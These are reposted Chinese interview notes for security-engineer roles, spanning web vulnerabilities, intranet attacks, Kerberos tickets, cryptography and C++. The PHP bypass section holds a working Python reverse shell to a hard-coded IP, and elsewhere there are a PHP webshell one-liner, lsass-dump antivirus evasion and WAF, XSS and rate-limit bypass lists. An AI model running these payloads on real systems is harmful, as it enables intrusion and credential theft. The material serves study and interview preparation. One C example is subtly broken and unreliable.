# cyber-security-interview
...


xxmmmm  猪猪谈安全  2023-03-14 19:49 发表于江苏
原文于：https://www.nowcoder.com/discuss/353158665735708672
原文作者：xxmmmm
10.12 阿里 安全工程师 10.22 二面
web安全 ，合规。一面问web，二面问内网。

1、跨域相关的内容
jsonp：如何实现跨域带第三方cookie？

跨域资源共享CORS

Ajx跨域请求ACCESS-Control-Allow-Origin白名单

2、最近有学习安全相关的内容吗？
可以说一说最近了解到的安全漏洞，或者实战挖洞。

3、实习经历介绍，语言开发能力
重java，可以了解一些java相关的漏洞

说一些有利于自己的内容。

4、Java反序列化漏洞的原理
可以说明原理，说明具体的漏洞

5、内网免杀
windows层面的AMSI

6、内网横向移动攻击步骤，常见的高危漏洞
远程访问，远程登录进行：SSH，VNC

SMB：445端口

windows内核溢出漏洞

7、渗透具体使用哪些工具
分类说，从信息收集到利用

8、SQL注入报错注入
报错函数，报错原理

9、内存马介绍原理
自己做过php、java tomcat、python的相关内存马，可以重点了解tomcat下的filter内存马。

10、漏洞修复如何与研发人员的沟通
11、安全方向兴趣


9.24 vivo 安全工程师 9.26二面
反作弊，体系管理，合规，应用安全，sdl，红蓝队，安全开发。

记得不是很清楚了，但是没问什么技术问题。


1、知名安全人物


9.8 360 安全分析研究员 9.16 二面 9.24hr
网络空间测绘 quake，信息收集，ATT&CK 探测手段收集，数据分析，APT

二面两个面试官一起面，还挺有难度的。

1、如何判断sql注入
2、了解什么新型漏洞？
这个通常考察是否经常关注安全圈的时事，记几个近期爆出来的漏洞

3、反序列化了解吗？
针对不是特别了解的领域，首先先去了解其原理，然后记一两个例子，做一做复现即可，比如apache shiro漏洞。

4、在内网哪些方式可以执行命令执行？
内网COM接口存在一些方法有命令执行的函数

5、信息收集步骤，从外网到内网
这个要具体去做实操，尽可能全面，做好分类，并附带使用工具。


6、命令执行无回显怎么做？
使用DNSlog或者SMBlog，当然存在一些局限性，如文件写入有限制，需要利用windows UNC路径，不同寻常的dns域名可能会被当做恶意的。




9.7 钉钉事业群
web安全熟悉主流的web安全技术，了解常见web漏洞原理和防范措施，对SQL注入、XSS、CSRF、RCE、越权等技术原理有深入了解，能够发现公司产品中存在的 web安全问题熟练使用SQLMap、Burp、AWVS、AppScan、Nessus等常见的web安全工具，对公司产品进行安全评估测试至少掌握一门主流编程语言，如Python/Java/C/C++等，用于编写脚本或开发辅助工具熟悉web渗透测试的基本流程具备自我学习能力，跟踪最新漏洞信息，进行业务产品的安全检查
移动客户端安全
PC客户端安全
安全研究
风控系统研发（Java）
移动安全研发
1、mimikatz免杀
用procdump导出lsass.dmp后拖回本地抓取密码来规避杀软。

2、黄金白银票据伪造区别
获取的权限不同

金票：伪造的TGT，可以获取任意Kerberos的访问权限 银票：伪造的ST，只能访问指定的服务，如CIFS

认证流程不同

金票：同KDC交互，但不同AS交互 银票：不同KDC交互，直接访问Server

加密方式不同

金票：由krbtgt NTLM Hash 加密 银票：由服务账号 NTLM Hash 加密

3、krbtgt重置
3、哪些域账户值得关注
默认本地帐户是在域控制器创建域时自动创建的内置帐户。这些默认本地帐户在 Active Directory 中具有对应项。 包括：Administrator、Guest 和 krbtgt。

合法用户开始与应用程序服务器进行服务请求通信。krbtgt 帐户充当密钥分发中心 (KDC) 的服务帐户，分为三个部分：数据库 (db)、身份验证服务器 (AS) 和票据授予服务器 (TGS)。身份验证服务器 (AS) 验证客户端身份验证。如果登录的用户通过身份验证成功，AS 会发出一个名为 TGT 的票据，向其他服务器确认该用户已通过身份验证。然后用户从 KDC 请求 TGS，该 TGS 将用于访问应用程序服务器的服务。

4、enter admin？
5、拿到域账户，如何找到登录ip主机
内网穿透，端口映射？

6、除了3389写payload还用什么方式写
7、布尔盲注怎么做
8、waf绕过
9、栈库分离怎么写shell
10、写一句话木马
11、如何检测sql注入
9.6 深信服 安全攻防研究 北京深圳
木马免杀，***绕过，内网突破等

1、实习经历介绍

2、复现漏洞深刻

3、如何找域控 ip
4、缓冲区溢出
缓冲区溢出通过往程序的缓冲区写超出其长度的内容，造成缓冲区的溢出，从而破坏程序的堆栈，造成程序崩溃或使程序转而执行其它指令，以达到攻击的目的。

5、rsa算法
非对称密钥算法

大素数分解

第一步，随机选择两个不相等的质数p和q。  爱丽丝选择了61和53。（实际应用中，这两个质数越大，就越难破解。）  第二步，计算p和q的乘积n。  爱丽丝就把61和53相乘。  n = 61×53 = 3233 n的长度就是密钥长度。3233写成二进制是110010100001，一共有12位，所以这个密钥就是12位。实际应用中，RSA密钥一般是1024位，重要场合则为2048位。  第三步，计算n的欧拉函数φ(n)。  n是质数，则 φ(n)=n-1 n = p1 × p2 φ(n) = φ(p1p2) = φ(p1)φ(p2) => φ(n) = (p-1)(q-1) 爱丽丝算出φ(3233)等于60×52，即3120。  第四步，随机选择一个整数e，条件是1< e < φ(n)，且e与φ(n) 互质。  爱丽丝就在1到3120之间，随机选择了17。（实际应用中，常常选择65537。）  第五步，计算e对于φ(n)的模反元素d。  所谓”模反元素”就是指有一个整数d，可以使得ed被φ(n)除的余数为1。  ed ≡ 1 (mod φ(n)) 这个式子等价于  ed - 1 = kφ(n) 于是，找到模反元素d，实质上就是对下面这个二元一次方程求解。(-k = y)  ex + φ(n)y = 1 已知 e=17, φ(n)=3120，  17x + 3120y = 1 这个方程可以用“扩展欧几里得算法”(又叫辗转相除法)求解，此处省略具体过程。总之，爱丽丝算出一组整数解为 (x,y)=(2753,-15)，即 d=2753。  至此所有计算完成。  第六步，将n和e封装成公钥，n和d封装成私钥。  在爱丽丝的例子中，n=3233，e=17，d=2753，所以公钥就是 (3233,17)，私钥就是（3233, 2753）。  实际应用中，公钥和私钥的数据都采用ASN.1格式表达。
ECC椭圆曲线加密算法。

DH密钥协商算法：DH算法解决了密钥在双方不直接传递密钥的情况下完成密钥交换

6、安全技术难题 如何解决
9.1 哈啰 一面
1、漏洞：
SQL 预编译 和c++预编译

C++会存在sql注入吗

XXE与文件上传

通常攻击者会将payload注入XML文件中，一旦文件被执行，将会读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。换而言之，XXE是一种从本地到达各种服务的方法。此外，在一定程度上这也可能帮助攻击者绕过***规则过滤或身份验证检查。

以下是一个简单的XML代码POST请求示例：

POST /vulnerable HTTP/1.1 Host: www.test.com User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Referer: https://test.com/test.html Content-Type: application/xml Content-Length: 294 Cookie: mycookie=cookies; Connection: close Upgrade-Insecure-Requests: 1  <?xml version="1.0"?> <catalog>  <core id="test101">  <author>John, Doe</author>  <title>I love XML</title>  <category>Computers</category>  <price>9.99</price>  <date>2018-10-01</date>  <description>XML is the best!</description>  </core> </catalog>
逻辑漏洞 ：一个返现的场景，哪些逻辑漏洞

ACCESS跨域，如何携带cookie

1、同域名下发送ajax请求，请求中默认会携带cookie  2、ajax在发送跨域请求时，默认情况下是不会携带cookie的  3、ajax在发送跨域请求时如果想携带cookie，必须将请求对象的withcredentials属性设置为true。  4、此时服务端的响应头Access-Control-Allow-Origin不能为*（星号）了，必须是白名单样式，也就是必须设置允许哪些url才能访问，如：  Access-Control-Allow-Origin: http://api.bob.com  5、除了对响应头Access-Control-Allow-Origin的设置，还必须设置另外一个响应头：Access-Control-Allow-Credentials:true。
XSS如何判断编码

序列化

https

对称与非对称

json转xml数据库

8.31 有赞一面 9.24二面
安全开发：工具，sdl，poc，代码审计，平台化

安全渗透：评估，测试，研究

1、redis未授权
2、宽字节注入
3、反序列化漏洞
序列化和反序列化本身并不存在问题。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。

4、CBC与GCM区别
AES-GCM可以并行加密解密，AES-CBC的模式决定了它只能串行地进行加密。因为加密是耗时较久的步骤，且加密的方式是相同的，所以并行地实现AES-GCM算法的时候，其效率是高于AES-CBC的；
AES-GCM提供了GMAC信息校验码，用以校验密文的完整性。AES-CBC没有，无法有效地校验密文的完整性；
AES-GCM是流加密的模式，不需要对明文进行填充。AES-CBC是块加密的模式，需要对明文进行填充。(AES-GCM中进行AES加密的是counter，AES-CBC中进行AES加密的是明文块)；
由于AES-CBC中必须要用到padding，导致最后一个明文块与其他密文块不同，因此可能会受到padding Oracle attacks，从而可以直接通过初始向量IV和密码，即可得到明文。
初始向量

初始向量IV的作用和MD5的加盐类似，目的是防止同样的明文块，始终加密成同样的密文块。以CBC模式为例如下：

图片

CBC模式在每一个明文块加密前，会让明文块和一个值先做异或操作。IV作为初始化向量，参与第一个明文块的异或。后续的每一个明文块和它前一个明文块所加密出的密文块相异或，从而保证加密出的密文块都不同

GCM

在CTR模式中，不再对明文进行加密，而是对一个逐次累加的计数器进行加密，用加密后得到的比特序列与明文分组进行异或，得到每一个明文块的密文。计数器的初始值，是依据于一个nonce的。

因为计数器是递增的，所以加密得到的比特序列是不同的，再与明文进行异或，可以避免相同的明文块被加密成一样的密文块。 因为每一个明文块的加密都是独立的，不依赖于其他明文块，所以CTR模式的AES加密是可以并行地对明文块进行加密的，并且不会有错误传播的现象。

以下为GCM模式。其中Ek为加密算法，AES-GCM中即为AES加密算法。Mh是将输入和密钥h在有限域GF上做乘法。

图片

GCM即是将CTR计数器模式，和GMAC验证码结合。这样即可以并行地进行加密过程，又可以对信息的完整性进行校验。 同时因为计数器模式属于流加密模式，而非块加密模式。因此GCM中明文不需要进行padding。

5、内网渗透

6、对有赞了解吗？
面之前一定要了解这个公司大致的业务！



8.30 启明星辰 一面 9.7二面
1、盲注函数
2、sql server注入
3、栈库分离怎么做
4、XSS绕过过滤
常见的编码方式有：HTML实体编码(&#ASCII),十进制、十六进制、八进制编码，unicode编码及escape编码及使用String.fromCharCode(...)绕过

大小写

双写

hex编码

针对开启了magic_quotes_gpc的网站，我们可以通过javascript中的String.fromCharCode方法来绕过，我们可以把alert(“XSS”);转换为String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34,41)那么我们的XSS语句就变成了。String.fromCharCode()是javascript中的字符串方法，用来把ASCII转换为字符串。

利用HTML标签属性值执行XSS：很多HTML标记中的属性都支持javascript:[code]伪协议的形式，这就给了注入XSS可乘之机,例如：


空格/回车/Tab

假设过滤函数进一步又过滤了javascript等敏感字符串，只需对javascript进行小小的操作即可绕过，例如：


比如<

5、免杀
8.29贝壳 渗透 一面 二面
技术安全：web

数据安全：合规建设

1、学过的课程
操作系统 网络安全 计算机网络 数据结构 密码学

2、对称与非对称
3、TCP三次握手和四次挥手
4、渗透流程
5、DOM型XSS如何实现攻击
6、挖洞 漏洞深刻的
7、SQL注入
8、逻辑漏洞
9、bp爆破如何做
二面

10、信息收集过程
11、社工的理解
12、子域名的收集方式
爆破，证书，域传送漏洞

13、IIS nginx 等中间件的漏洞
解析漏洞

14、bp爆破，限制请求？
速率限制：

这种功能的实现一般是通过检查session缓存中的信息来识别某个用户session或IP地址在短时间内访问过多，应该限制访问速率。

如果某个客户端在特定时间段内发出过多请求，后端服务器则会直接返回错误代码429：请求过多。

实现速率限制功能时的一个常见错误是，限制规则往往会把本地IP放在白名单，例如127.0.0.1（localhost）等。于是我在请求中添加了HTTP请求头X-Remote-IP:127.0.0.1

在http内容里添加：client-ip:1.2.3.4 顾名思义，客户端ip

关于短信轰炸

现在有的短信发送限制为一分钟发送一次，可以通过Burp设置延时爆破，一分钟爆破一次。 图片

15、python写端口扫描的脚本库
request socket

8.26 中电10所一面 9.6 综合面
对岗位的理解，想做管理还是技术

等保分为几级：

在网络安全等级保护2.0国家标准（等保2.0）中，信息安全等级保护分为五级，分别是第一级（自主保护级）、第二级（指导保护级）、第三级（监督保护级）、第四级（强制保护级）和第五级（专控保护级），一至五级等级逐级增高。

图片

8.26 BIGO 9.3二面
欢聚 短视频

业务安全，防爬虫

网络安全：渗透 扫描工具开发，waf规则，SRC

1、SQL union 报错 宽字节 SQL危害 写入文件
数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。
网页篡改：通过操作数据库对特定网页进行篡改。
网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。
数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。
服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。
破坏硬盘数据，瘫痪全系统。
SQL注入读写文件的根本条件：

1. 数据库允许导入导出（secure_file_priv）  2. 当前用户用户文件操作权限（File_priv）
load_file()读文件 into outfile / into dumpfile写文件 条件：

1.对web目录具有读写权限  2. 知道文件绝对路径  3. 能够使用联合查询（sql注入时）


2、XSS , waf绕过方式，哪些编码
ASCII码

Unicode符号集

UTF-8

URL

base64

3、同源策略，请求别的网站图片会用到同源嘛
4、SSRF,gopher和http区别
Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它。

在gopher协议中发送HTTP的数据，需要以下三步：

1、构造HTTP数据包  2、URL编码、替换回车换行为%0d%0a  3、发送gopher协议
gopher是老的以文本（TEXT)为主的网页的网站服务器，现在基本淘汰了。用gopher协议。

http是现在最流行的网站服务器类型。用http协议。

5、CSRF，Referer如何绕过？
Referer是请求头的一部分，假设A站上有B站的链接，在A站上点击B站的链接，请求头会带有Referer，而Referer的值为A站的链接

子域名方式
域名前增加：在域名前面增加随机的a-z和0-9也可以进绕过
？号：将域名作为GET请求参数进行绕过
利用https协议： https向http跳转的时候Referer为空
添加无Referer标签：可以尝试无Referer标签，万一逻辑刚好没判断无Referer的情况呢；<meta name="referrer" content="never">
6、信息收集 收集哪些
二面

7、CSRF与SSRF区别
SSRF黑名单 ip 域名 限制哪些

整数解析到本地 127.0.0.1 localhost

8、http走私
https://www.freebuf.com/company-information/234495.html

在HTTP1.1后，增加了一个特殊的请求头Connection: Keep-Alive，建立tcp持续通道，进行一次tcp握手，就能传送多个请求。但这样子只能是请求一次响应一次。为了提高数据传输的效率，减少阻塞。后来就有了HTTP Pipelining(管线化)字段，它是将多个http请求批量提交,而不用等收到响应再提交的异步技术。如下图就是使用Pipelining和非Pipelining

图片

这意味着前端与后端必须短时间内对每个数据包的边界大小达成一致，否则，攻击者就可以构造发送一个特殊的数据包，在前端看来它是一个请求，但在后端却被解释为了两个不同的HTTP请求。这就导致攻击者可以在下一个用户发送的合法数据包前恶意添加内容。如图，走私的内容("前缀")，以橙色突出显示：

图片

假设前端考虑的是内容长度头部(Content-Length)值作为数据包结束的边界，后端优先考虑的是Transfer-Encoding头部。那么从后端角度看，如下图蓝色部份字体属于一个数据包，而红色部份字体属于下一个数据包的开始部份。这样就成功从前端“走私”了一个数据包。

图片

9、信息收集如果没有可利用信息如何利用
10、内网涉及的工具
黄金票据

如何查看自己已有的票据

11、互斥锁
互斥：指在某一时刻指允许一个进程运行其中的程序片，具有排他性和唯一性。 对于线程A和线程B来讲，在同一时刻，只允许一个线程对临界资源进行操作，即当A进入临界区对资源操作时，B就必须等待；当A执行完，退出临界区后，B才能对临界资源进行操作。
12、inline内联 static
引入内联函数的目的是为了解决程序中函数调用的效率问题。为了解决一些频繁调用的小函数大量消耗栈空间（栈内存）的问题  函数是一种更高级的抽象。它的引入使得编程者只关心函数的功能和使用方法，而不必关心函数功能的具体实现；函数的引入可以减少程序的目标代码，实现程序代码和数据的共享。  但是，函数调用也会带来降低效率的问题，因为调用函数实际上将程序执行顺序转移到函数所存放在内存中某个地址，将函数的程序内容执行完后，再返回到转去执行该函数前的地方。这种转移操作要求在转去前要保护现场并记忆执行的地址，转回后先要恢复现场，并按原来保存地址继续执行。因此，函数调用要有一定的时间和空间方面的开销，于是将影响其效率。特别是对于一些函数体代码不是很大，但又频繁地被调用的函数来讲，解决其效率问题更为重要。引入内联函数实际上就是为了解决这一问题。 
在程序编译时，编译器将程序中出现的内联函数的调用表达式用内联函数的函数体来进行替换。显然，这种做法不会产生转去转回的问题，但是由于在编译时将函数体中的代码被替代到程序中，因此会增加目标程序代码量，进而增加空间开销，而在时间代销上不象函数调用时那么大，可见它是以目标代码的增加为代价来换取时间的节省。

在程序中，调用其函数时，该函数在编译时被替代，而不是像一般函数那样是在运行时被调用。

函数的死循环递归调用的最终结果就是导致栈内存空间枯竭。

#include <stdio.h> //函数定义为inline即:内联函数 inline char* dbtest(int a) {  return (i % 2 > 0) ? "奇" : "偶"; }   int main() {  int i = 0;  for (i=1; i < 100; i++) {  printf("i:%d    奇偶性:%s /n", i, dbtest(i));   } }
上面的例子就是标准的内联函数的用法，使用inline修饰带来的好处我们表面看不出来，其实，在内部的工作就是在每个for循环的内部任何调用dbtest(i)的地方都换成了(i%2>0)?”奇”:”偶”，这样就避免了频繁调用函数对栈内存重复开辟所带来的消耗。

static隐藏。

当我们同时编译多个文件时，所有未加 static 前缀的全局变量和函数都具有全局可见性。

如果加了 static，就会对其它源文件隐藏。例如在a.c中 a 和 msg 的定义前加上 static，main.c 就看不到它们了。利用这一特性可以在不同的文件中定义同名函数和同名变量，而不必担心命名冲突。static 可以用作函数和变量的前缀，对于函数来讲，static 的作用仅限于隐藏。

static 的第二个作用是保持变量内容的持久。

存储在静态数据区的变量会在程序刚开始运行时就完成初始化，也是唯一的一次初始化。共有两种变量存储在静态存储区：全局变量和 static 变量，只不过和全局变量比起来，static 可以控制变量的可见范围..存储在静态区的数据生命周期与程序相同，在main函数之前初始化，在程序退出时销毁。（无论是局部静态还是全局静态）

static 的第三个作用是默认初始化为 0

最后对 static 的三条作用做一句话总结。首先 static 的最主要功能是隐藏，其次因为 static 变量存放在静态存储区，所以它具备持久性和默认值0。

13、编程 输入整数 二进制倒序转整数输出

8.25 奇安信HR
HR常见问题。

1、我预期的团队
沟通，技术大牛，管理

8.25 京东 转推
一些简历问题或者啥的 随机应变。

1、open***协议
2、https认证流程
8.23 腾讯云
1、SQL注入原理
2、预编译防御SQL原理
preparedstatement：流程大致如下：

解析阶段
编译阶段
优化阶段
缓存阶段
执行阶段
PrepareStatement已经经历了上述过程，就不会重新编译，用户的数据只能作为数据进行填充，而不是sql的一部分。服务器从缓存中获得已经编译优化后的语句，替换掉用户数据执行，避免了sql注入。即使参数里有敏感字符如 or '1=1’也数据库会作为一个参数一个字段的属性值来处理而不会作为一个SQL指令。

3、waf防御原理
WAF部署在web应用程序前面，在用户请求到达web服务器前对用户请求进行扫描和过滤，分析并校验每个用户请求的网络包，确保每个用户请求有效且安全，对无效或有攻击行为的请求进行阻断或隔离。通过检查HTTP流量，可以防止源自web应用程序的安全漏洞（如SQL注入，跨站脚本攻击，文件包含和安全配置错误）的攻击。

基于规则的WAF

当前市场上waf产品核心的防护机制是“规则”，每一个请求、会话，经过抓包，“开包检查”，每一项规则都会检查到，一旦检查不通过，就会被认为是非法访问，拒绝处理。

一般开发人员防御策略

客户端javascript校验(一般只校验后缀名)服务端校验1>文件头content-type字段校验（image/gif）2>文件内容头校验（GIF89a）3>后缀名黑名单校验4>后缀名白名单校验5>自定义正则校验6>WAF设备校验（根据不同的WAF产品而定）

分类：

软WAF
软件WAF安装过程比较简单，需要安装到需要安全防护的web服务器上，以纯软件的方式实现。

代表产品：安全狗，云锁，D盾等

硬WAF
硬件WAF的价格一般比较昂贵，支持多种方式部署到Web服务器前端，识别外部的异常流量，并进行阻断拦截，为Web应用提供安全防护。

代表产品有：Imperva、天清WAG等

云WAF
云WAF的维护成本低，不需要部署任何硬件设备，云WAF的拦截规则会实时更新。对于部署了云WAF的网站，我们发出的数据请求首先会经过云WAF节点进行规则检测，如果请求匹配到WAF拦截规则，则会被WAF进行拦截处理，对于正常、安全的请求则转发到真实Web服务器中进行响应处理。

代表产品有：阿里云云盾，腾讯云WAF等

绕过
编码绕过：URL编码，二次编码，Unicode编码，Base64编码，Hex编码，ASCII编码等

字母大小写转换绕过

空格过滤绕过：空格过滤绕过： 09，0A，0B，0C，0D，A0，20

使用‘+’替换空格绕过

使用注释符/**/替换空格绕过

双关键字绕过

内联注释绕过：在MySQL里，/*/是多行注释，这个是SQL的标准，但是MySQL扩张了解释的功能，如果在开头的的/后头加了惊叹号（/!50001sleep(3)/），那么此注释里的语句将被执行。

请求方式差异规则松懈性绕过：有些WAF同时接收GET方法和POST的方法，但只在GET方法中增加了过滤规则，可通过发送POST方法进行绕过

异常Method绕过：有些WAF只检测GET，POST方法，可通过使用异常方法进行绕过。

超大数据包绕过：部分WAF只检测固定大小的内容，可通过添加无用字符进行绕过检测

复参数绕过：在提交的URL中给一个参数多次赋了不同的值(?id=1&id=2)，部分WAF在处理的过程中可能只处理前面提交的参数值(id=1)，而后端程序在处理的时候可能取的是最后面的值。

协议未覆盖绕过：以下四种常见的content-type类型。部分WAF可能只对一种content-type类型增加了检测规则，可以尝试互相替换尝试去绕过WAF过滤机制。例如使用multipart/form-data进行绕过。

Content-Type:multipart/form-data;
Content-Type:application/x-www-form-urlencoded
Content-Type: text/xml
Content-Type: application/json
宽字节绕过：宽字节注入是因为使用了GBK编码。为了防止sql注入，提交的单引号(%27)会进行转义处理，即在单引号前加上斜杠(%5C%27)。

%00截断：部分WAF在解析参数的时候当遇到%00时，就会认为参数读取已结束，这样就会只对部分内容进行了过滤检测。

Cookie/X-Forwarded-For注入绕过：部分WAF可能只对GET，POST提交的参数进行过滤，未对Cookie或者X-Forwarded-For进行检测，可通过cookie或者X-Forwarded-For提交注入参数语句进行绕过。

利用pipline绕过：当请求中的Connection字段值为keep-alive，则代表本次发起的请求所建立的tcp连接不断开，直到所发送内容结束Connection为close为止。部分WAF可能只对第一次传输过来的请求进行过滤处理。

利用分块编码传输绕过：分块传输编码是HTTP的一种数据传输机制，允许将消息体分成若干块进行发送。当数据请求包中header信息存在Transfer-Encoding: chunked，就代表这个消息体采用了分块编码传输。

防御
1.目录设为不可执行:

只要web容器无法解析该目录下的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，所以此点至关重要。

2.判断文件类型:

判断文件类型时，应结合MIME-Type、后缀检查等方式、推荐使用白名单的方式。

3.用随机数改写:

文件上传如果要执行代码，则需要用户能访问到这个文件。在某些环境下，用户能上传，但是不能访问。

4、php审计思路 ==和===漏洞
在PHP中遇到数字与字符串进行松散比较()时，会将字符串中前几位是数字且数字后面不是”."，“e"或"E"的子串转化为数字，与数字进行比较，如果相同则返回为true，不同返回为false，后面的所有字符串直接截断扔掉。如果字符串数字后面是”." , “e”, “E”，则会有其他结果。两字符串，一个是纯数字型，一个只能出现字符，使两个的md5哈希值相等

"."为浮点数的标志，会将字符串的子串转化为浮点数。 "e"和"E"为科学计数法的标志，将字符串的子串转化为科学计数法。 所以比较出错。
5、代码执行函数，disable_function绕过
系统命令：system,exec,shell_exec,passthru“&、|、||”

代码执行：eval,assert,preg_replace()

disable_functions禁用危险函数，执行代码转义，字符串加引号，禁止文件执行动态代码权限。

绕过
利用黑名单不全绕过：exec()，shell_exec()，system()，passthru()，popen()，proc_open()还有一个比较常见的易被忽略的函数就是pcntl_exec。

PHP安装并启用了pcntl插件  pcntl是linux下的一个扩展，可以支持php的多线程操作。很多时候会碰到禁用exec函数的情况，但如果运维人员安全意识不强或对PHP不甚了解，则很有可能忽略pcntl扩展的相关函数。  pcntl_exec()是pcntl插件专有的命令执行函数来执行系统命令函数，可以在当前进程空间执行指定的程序。
由于pcntl_exec()执行命令是没有回显的，所以其常与python结合来反弹shell：

<?php pcntl_exec("/usr/bin/python",array('-c','import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect(("132.232.75.90",9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'));
利用php7 mail绕过

利用 LD_PRELOAD 环境变量
LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的攻击目的。

我们通过环境变量 LD_PRELOAD 劫持系统函数，可以达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。

想要利用LD_PRELOAD环境变量绕过disable_functions需要注意以下几点：

能够上传自己的.so文件
能够控制LD_PRELOAD环境变量的值，比如putenv()函数
因为新进程启动将加载LD_PRELOAD中的.so文件，所以要存在可以控制PHP启动外部程序的函数并能执行，比如mail()、imap_mail()、mb_send_mail()和error_log()函数等
一般而言，利用漏洞控制 web 启动新进程 a.bin（即便进程名无法让我随意指定），新进程 a.bin 内部调用系统函数 b()，b() 位于 系统共享对象 c.so 中，所以系统为该进程加载共享对象 c.so，想办法在加载 c.so 前优先加载可控的 c_evil.so，c_evil.so 内含与 b() 同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内的b() 而非系统的 c.so 内 b()，同时，c_evil.so 可控，达到执行恶意代码的目的。基于这一思路，常见突破 disable_functions 限制执行操作系统命令的方式为：

编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 getuid_shadow.so；
运行 PHP 函数 putenv()（用来配置系统环境变量），设定环境变量 LD_PRELOAD 为 getuid_shadow.so，以便后续启动新进程时优先加载该共享对象；
运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步 LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 getuid_shadow.so 中的同名 getuid() 所劫持；
达到不调用 PHP 的 各种 命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。
之所以劫持 getuid()，是因为 sendmail 程序会调用该函数（当然也可以为其他被调用的系统函数），在真实环境中，存在两方面问题：

一是，某些环境中，web 禁止启用 sendmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 getuid()，通常的 www-data 权限又不可能去更改 php.ini 配置、去安装 sendmail 软件；
二是，即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入 hosts（如，127.0.0.1 lamp、lamp.、lamp.com）。
PHP-FPM绕过
这里由于FPM默认监听的是9000端口，我们就可以绕过Web服务器，直接构造Fastcgi协议，和fpm进行通信。于是就有了利用 Webshell 直接与 FPM 通信 来绕过 disable functions 的姿势。

6、SSRF如何打redis
gopher写入shell

7、写入一句话木马，菜刀连接原理
<?php @eval($_POST[cmd]);?>
<?php @eval($_REQUEST[cmd]);?>
eval函数 会将括号里面的代码通过php语言来进行执行 $_POST函数的意思就是来收集 请求方法为post 的名字为key表单里面的值.中国菜刀的本质其实就是 模拟发包。中国菜刀发的这么一个包 包的代码是打开指定目录的句柄，然后进行循环扫描，并附带上权限、时间、大小、日期 这个包我这里用package来代替 所以在操作的时候其实就是 key = package 然后通过eval函数执行package的php代码 从而最终达成目的。是将一些打开文件系统命令通过POST请求传入cmd中，但是传给cmd的这些字符串，必须以分号结尾，再通过php解析，eval执行函数，执行括号中的语句，即可触发后门。

通过post传入的ss参数，参数进行了base64加密。

8、黄金票据
9、如何反弹shell
python反弹

10、TCP协议和三次握手四次挥手
11、多继承
C++ 中的继承是类与类之间的关系，是一个很简单很直观的概念，与现实世界中的继承类似，例如儿子继承父亲的财产。

继承（Inheritance）可以理解为一个类从另一个类获取成员变量和成员函数的过程。例如类 B 继承于类 A，那么 B 就拥有 A 的成员变量和成员函数。

派生类都只有一个基类，称为单继承（Single Inheritance）。除此之外，C++也支持多继承（Multiple Inheritance），即一个派生类可以有两个或多个基类。

12、模板
泛型程序设计（generic programming）是一种算法在实现时不指定具体要操作的数据的类型的程序设计方法。所谓“泛型”，指的是算法只要实现一遍，就能适用于多种数据类型。泛型程序设计方法的优势在于能够减少重复代码的编写。

面向对象程序设计语言有封装、继承和多态三种机制，这三种机制能够有效提高程序的可读性、可扩充性和可重用性。

“多态（polymorphism）”指的是同一名字的事物可以完成不同的功能。多态可以分为编译时的多态和运行时的多态。前者主要是指函数的重载（包括运算符的重载）、对重载函数的调用，在编译时就能根据实参确定应该调用哪个函数，因此叫编译时的多态；而后者则和继承、虚函数等概念有关。

13、C++与C区别
C是面向过程的语言，而C++是面向对象的语言，因此C++语言中有类和对象以及继承多态这样的OOP语言必备的内容，此外C++支持模板，运算符重载，异常处理机制，以及一个非常强大的C++标准模板库STL，另外一个Boost库现在也归属C++标准库，提供了很多强大的功能。

C只能写面向过程的代码，而C++既可以写面向过程的代码，也可以实现面向对象的代码；既然C++是面向对象的OOP语言，因此它还有非常强大的设计模式，比如单例，工厂，观察者模式等等，这些在C语言当中都是不支持的。

C和C++一个典型的区别就在动态内存管理上了，C语言通过malloc和free来进行堆内存的分配和释放，而C++是通过new和delete来管理堆内存的（至于new/malloc有什么区别，delete/free有什么区别，你等面试官来继续深入问你，先从大方向上罗列区别，让他感受一下你只是的全面性^^）。new比malloc多一项功能，就是开辟完内存，还可以进行初始化操作，delete比free多一项功能就是在释放内存之前，还可以析构指针指向的对象。

(1）malloc和new都是在堆上开辟内存的
malloc只负责开辟内存，没有初始化功能，需要用户自己初始化；new不但开辟内存，还可以进行初始化，如new int(10)；表示在堆上开辟了一个4字节的int整形内存，初始值是10，再如new int[10] ()；表示在堆上开辟了一个包含10个整形元素的数组，初始值都为0。

